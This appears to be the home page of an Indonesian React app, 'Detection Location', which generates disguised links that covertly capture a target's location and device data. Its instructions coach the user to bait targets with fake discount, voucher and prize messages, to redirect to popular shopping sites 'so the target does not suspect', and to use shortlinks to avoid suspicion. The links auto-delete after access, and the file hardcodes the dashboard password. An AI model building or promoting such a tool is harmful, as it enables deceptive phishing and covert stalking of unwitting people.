import { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase'
import { Link } from 'react-router-dom'

// Password yang sama dengan dashboard untuk konsistensi
const DASHBOARD_PASSWORD = "psy27"

export default function Home() {
  const [name, setName] = useState('')
  const [description, setDescription] = useState('')
  const [redirectUrl, setRedirectUrl] = useState('https://google.com')  // Default redirect URL
  const [useShortLink, setUseShortLink] = useState(true)  // Default menggunakan shortlink
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [existingLinks, setExistingLinks] = useState<string[]>([])
  const [showPassword, setShowPassword] = useState(false)
  const [createdLink, setCreatedLink] = useState<{name: string; tracking_code: string; short_url?: string} | null>(null)
  const [copied, setCopied] = useState<'link' | 'code' | 'short' | null>(null)

  // Ambil data link yang sudah ada saat komponen dimuat
  useEffect(() => {
    const fetchExistingLinks = async () => {
      try {
        // Hanya mengambil link yang belum diklik
        const { data } = await supabase
          .from('tracking_links')
          .select('name')
          .eq('is_clicked', false)
          .or('is_clicked.is.null')
        
        if (data) {
          const names = data.map(link => link.name)
          setExistingLinks(names)
        }
      } catch (error) {
        console.error('Error fetching existing links:', error)
      }
    }

    fetchExistingLinks()
  }, [])

  // Reset copied state setelah 2 detik
  useEffect(() => {
    if (copied) {
      const timer = setTimeout(() => {
        setCopied(null)
      }, 2000)
      return () => clearTimeout(timer)
    }
  }, [copied])

  const generateTrackingCode = () => {
    return Math.random().toString(36).substring(2, 8)
  }

  // Fungsi untuk membuat shortlink tanpa menggunakan API eksternal
  const createLocalShortLink = () => {
    // Generate 6 karakter acak untuk shortlink
    const shortCode = Math.random().toString(36).substring(2, 8);
    // Format shortlink dengan domain aplikasi
    return `${window.location.origin}/s/${shortCode}`;
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Reset error and set loading
    setError(null)
    setLoading(true)
    
    // Validasi nama link
    const processedName = name.trim().toLowerCase().replace(/\s+/g, '-')
    
    if (processedName.length < 3) {
      setError('Nama link minimal 3 karakter')
      setLoading(false)
      return
    }
    
    // Validasi - cek jika nama sudah digunakan
    if (existingLinks.includes(processedName)) {
      setError('Nama link sudah digunakan, gunakan nama lain')
      setLoading(false)
      return
    }
    
    // Validasi URL redirect
    let validatedRedirectUrl = redirectUrl.trim()
    if (!validatedRedirectUrl) {
      validatedRedirectUrl = 'https://google.com'
    } else if (!/^https?:\/\//i.test(validatedRedirectUrl)) {
      validatedRedirectUrl = 'https://' + validatedRedirectUrl
    }
    
    try {
      // Generate kode tracking unik
      const tracking_code = generateTrackingCode()
      
      // Buat shortlink lokal jika user memilih opsi ini
      let shortUrl = null
      if (useShortLink) {
        shortUrl = createLocalShortLink();
      }
      
      // Insert data ke table tracking_links
      const { data, error } = await supabase
        .from('tracking_links')
        .insert([
          { 
            name: processedName, 
            tracking_code
          }
        ])
        .select()
      
      if (error) throw error
      
      // Set created link dan reset form
      setCreatedLink({
        ...data[0],
        description: description.trim() || null,
        redirect_url: validatedRedirectUrl,
        short_url: shortUrl
      })
      setName('')
      setDescription('')
      setRedirectUrl('https://google.com')
    } catch (error: unknown) {
      console.error('Error creating link:', error)
      setError(error instanceof Error ? error.message : 'Terjadi kesalahan saat membuat link')
    } finally {
      setLoading(false)
    }
  }

  const copyToClipboard = (text: string | undefined, type: 'link' | 'code' | 'short') => {
    if (!text) return
    navigator.clipboard.writeText(text)
    setCopied(type)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-100 to-pink-100 py-12">
      <div className="max-w-4xl mx-auto px-4">
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-600 to-pink-600 mb-4 flex items-center justify-center">
            <svg className="w-10 h-10 mr-2 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
              <circle cx="12" cy="10" r="3"></circle>
            </svg>
            Detection Location
          </h1>
          <p className="text-lg text-gray-600 max-w-2xl mx-auto">
            Buat link menarik untuk melacak lokasi dengan mudah.
          </p>
          <div className="mt-4">
            <Link 
              to="/dashboard" 
              className="inline-flex items-center bg-white py-2 px-4 rounded-lg text-purple-600 hover:bg-gray-50 hover:text-purple-700 transition-all duration-300 shadow-sm"
            >
              <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path>
              </svg>
              <span>Buka Dashboard</span>
            </Link>
          </div>
        </div>
        
        <div className="card mb-8 bg-yellow-50 border-l-4 border-yellow-400">
          <div className="flex items-center">
            <svg className="h-6 w-6 text-yellow-500 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
            <p className="font-bold text-yellow-800">Penggunaan untuk melacak pasangan menyebabkan drama kolosal</p>
          </div>
        </div>
        
        <div className="card mb-8">
          <h2 className="text-2xl font-bold text-gray-800 mb-4">Cara Penggunaan</h2>
          <ol className="list-decimal pl-5 space-y-3 text-gray-700">
            <li>
              <span className="font-medium">Buat Link Tracking</span>
              <p className="text-gray-600">Buat link dengan nama yang menarik seperti "promo-diskon" atau "undian-hadiah"</p>
              <div className="mt-2 bg-gray-50 p-3 rounded-lg">
                <p className="text-sm text-gray-500 font-medium">Contoh Deskripsi yang Efektif:</p>
                <ul className="list-disc pl-5 mt-1 text-sm">
                  <li>"Selamat! Anda terpilih mendapatkan promo diskon 70% untuk merchant di sekitar Anda"</li>
                  <li>"Dapatkan voucher belanja Rp 100.000 untuk toko terdekat dari lokasi Anda"</li>
                  <li>"Kupon GRATIS menu spesial dari restoran terbaik di kota Anda"</li>
                </ul>
              </div>
            </li>
            <li>
              <span className="font-medium">Tentukan URL Redirect</span>
              <p className="text-gray-600">Setelah lokasi terdeteksi, pengguna akan diarahkan ke website yang Anda tentukan</p>
              <div className="mt-2 bg-gray-50 p-3 rounded-lg">
                <p className="text-sm text-gray-500 font-medium">Tips URL Redirect:</p>
                <ul className="list-disc pl-5 mt-1 text-sm">
                  <li>Gunakan website populer seperti Tokopedia atau Shopee agar tidak mencurigakan</li>
                  <li>Arahkan ke halaman promo resmi agar target tidak curiga</li>
                  <li>Website berita populer juga dapat menjadi pilihan yang baik</li>
                </ul>
              </div>
            </li>
            <li>
              <span className="font-medium">Bagikan Link</span>
              <p className="text-gray-600">Kirim link yang telah dibuat ke target dengan pesan yang menarik</p>
              <div className="mt-2 bg-gray-50 p-3 rounded-lg">
                <p className="text-sm text-gray-500 font-medium">Contoh Pesan Bagikan:</p>
                <ul className="list-disc pl-5 mt-1 text-sm">
                  <li>"Hai, cek promo spesial ini! Diskonnya gila-gilaan: [LINK]"</li>
                  <li>"Ada voucher gratis nih, tinggal ambil di kota kamu: [LINK]"</li>
                  <li>"Kamu terpilih dapat hadiah dari toko online, klaim di: [LINK]"</li>
                </ul>
              </div>
            </li>
            <li>
              <span className="font-medium">Lihat Hasil</span>
              <p className="text-gray-600">
                Pantau lokasi dan informasi perangkat di halaman dashboard dengan memasukkan kode tracking Anda
                (Password dashboard: <span className="font-mono">{showPassword ? DASHBOARD_PASSWORD : "•••••••"}</span>
                <button 
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="ml-2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? (
                    <svg className="h-4 w-4 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  ) : (
                    <svg className="h-4 w-4 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>)
              </p>
            </li>
          </ol>
        </div>
        
        {createdLink ? (
          <div className="card mb-8 border-2 border-green-200">
            <div className="mb-4 flex items-center">
              <svg className="w-6 h-6 text-green-500 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <h2 className="text-xl font-bold text-gray-800">Link Berhasil Dibuat!</h2>
            </div>

            <div className="space-y-4">
              <div className="p-4 bg-gray-50 rounded-lg">
                <div className="flex flex-col md:flex-row md:items-center md:justify-between">
                  <div>
                    <p className="text-sm text-gray-500 mb-1">Link Tracking:</p>
                    <p className="font-medium text-gray-800 break-all">
                      {window.location.origin}/promo/{createdLink.name}
                    </p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(`${window.location.origin}/promo/${createdLink.name}`, 'link')}
                    className="mt-2 md:mt-0 flex items-center text-purple-600 hover:text-purple-700"
                  >
                    {copied === 'link' ? (
                      <>
                        <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                        </svg>
                        Disalin!
                      </>
                    ) : (
                      <>
                        <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2" />
                        </svg>
                        Salin Link
                      </>
                    )}
                  </button>
                </div>
              </div>

              {createdLink.short_url && (
                <div className="p-4 bg-green-50 rounded-lg border border-green-100">
                  <div className="flex flex-col md:flex-row md:items-center md:justify-between">
                    <div>
                      <p className="text-sm text-gray-500 mb-1">Shortlink (Rekomendasikan):</p>
                      <p className="font-medium text-gray-800 break-all">
                        {createdLink.short_url}
                      </p>
                    </div>
                    <button
                      onClick={() => copyToClipboard(createdLink.short_url, 'short')}
                      className="mt-2 md:mt-0 flex items-center text-green-600 hover:text-green-700"
                    >
                      {copied === 'short' ? (
                        <>
                          <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                          </svg>
                          Disalin!
                        </>
                      ) : (
                        <>
                          <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2" />
                          </svg>
                          Salin Shortlink
                        </>
                      )}
                    </button>
                  </div>
                </div>
              )}

              <div className="p-4 bg-gray-50 rounded-lg">
                <div className="flex flex-col md:flex-row md:items-center md:justify-between">
                  <div>
                    <p className="text-sm text-gray-500 mb-1">Kode Tracking:</p>
                    <p className="font-mono font-medium text-gray-800">{createdLink.tracking_code}</p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(createdLink.tracking_code, 'code')}
                    className="mt-2 md:mt-0 flex items-center text-purple-600 hover:text-purple-700"
                  >
                    {copied === 'code' ? (
                      <>
                        <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                        </svg>
                        Disalin!
                      </>
                    ) : (
                      <>
                        <svg className="w-5 h-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2" />
                        </svg>
                        Salin Kode
                      </>
                    )}
                  </button>
                </div>
              </div>

              <div className="p-4 bg-purple-50 rounded-lg">
                <p className="text-purple-800">
                  <span className="font-medium">Petunjuk:</span> Bagikan link di atas kepada target Anda. Simpan kode tracking untuk melihat hasil pelacakan nanti.
                </p>
                <p className="text-purple-800 mt-2">
                  <span className="font-medium">Catatan:</span> Link akan otomatis dihapus 30 detik setelah target mengaksesnya. Hasil lokasi tetap tersimpan di dashboard.
                </p>
              </div>
            </div>

            <div className="mt-6 flex flex-col sm:flex-row gap-4">
              <button
                onClick={() => setCreatedLink(null)}
                className="flex-1 bg-gradient-to-r from-purple-600 to-pink-600 text-white py-3 px-6 rounded-lg font-medium hover:from-purple-700 hover:to-pink-700 transition-all duration-300"
              >
                Buat Link Baru
              </button>
              <Link 
                to="/dashboard" 
                className="flex-1 flex items-center justify-center bg-white border border-purple-200 text-purple-600 py-3 px-6 rounded-lg font-medium hover:bg-purple-50 transition-all duration-300"
              >
                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path>
                </svg>
                Lihat di Dashboard
              </Link>
            </div>
          </div>
        ) : (
          <div className="card mb-8 transform hover:scale-[1.01] transition-transform duration-300">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="name" className="block text-gray-700 font-medium mb-2">
                  Nama Link
                </label>
                <input
                  type="text"
                  id="name"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="input-primary"
                  placeholder="Contoh: promo-spesial, undian-berhadiah"
                  required
                />
              </div>
              
              <div>
                <label htmlFor="description" className="block text-gray-700 font-medium mb-2">
                  Deskripsi (opsional)
                </label>
                <textarea
                  id="description"
                  value={description}
                  onChange={(e) => setDescription(e.target.value)}
                  className="input-primary min-h-[100px]"
                  placeholder="Tambahkan deskripsi untuk link tracking (akan ditampilkan di halaman tracking)"
                />
                <p className="mt-1 text-sm text-gray-500">
                  Deskripsi akan ditampilkan pada halaman tracking untuk membuat link lebih meyakinkan
                </p>
              </div>
              
              <div>
                <label htmlFor="redirectUrl" className="block text-gray-700 font-medium mb-2">
                  URL Redirect
                </label>
                <input
                  type="text"
                  id="redirectUrl"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  className="input-primary"
                  placeholder="https://google.com"
                />
                <p className="mt-1 text-sm text-gray-500">
                  Pengguna akan diarahkan ke URL ini setelah lokasi terdeteksi
                </p>
              </div>
              
              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="useShortLink"
                  checked={useShortLink}
                  onChange={(e) => setUseShortLink(e.target.checked)}
                  className="h-4 w-4 text-purple-600 focus:ring-purple-500 border-gray-300 rounded"
                />
                <label htmlFor="useShortLink" className="ml-2 block text-gray-700">
                  Gunakan Shortlink (rekomendasikan)
                </label>
                <div className="ml-2 group relative">
                  <svg className="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <div className="hidden group-hover:block absolute left-0 bottom-full mb-2 w-64 p-2 bg-gray-800 text-white text-xs rounded shadow-lg z-10">
                    Shortlink membuat URL lebih pendek dan tidak mencurigakan, mengurangi kecurigaan target saat menerima link.
                  </div>
                </div>
              </div>
              
              <div className="bg-yellow-50 p-4 rounded-lg">
                <div className="flex items-center text-yellow-800 font-medium mb-2">
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Fitur Keamanan
                </div>
                <p className="text-yellow-700 text-sm">
                  Link akan otomatis dihapus 30 detik setelah target mengaksesnya. Nama link tidak akan bisa digunakan lagi, 
                  tapi data lokasi tetap tersimpan di dashboard. Pastikan Anda menyimpan kode tracking!
                </p>
              </div>

              {error && (
                <div className="p-4 bg-red-50 text-red-600 rounded-lg border border-red-200">
                  <div className="flex items-center mb-1">
                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <span className="font-medium">Tidak dapat membuat link</span>
                  </div>
                  <p>{error}</p>
                </div>
              )}
              <button
                type="submit"
                disabled={loading}
                className="btn-primary w-full"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Membuat...
                  </span>
                ) : (
                  'Buat Link'
                )}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  )
} 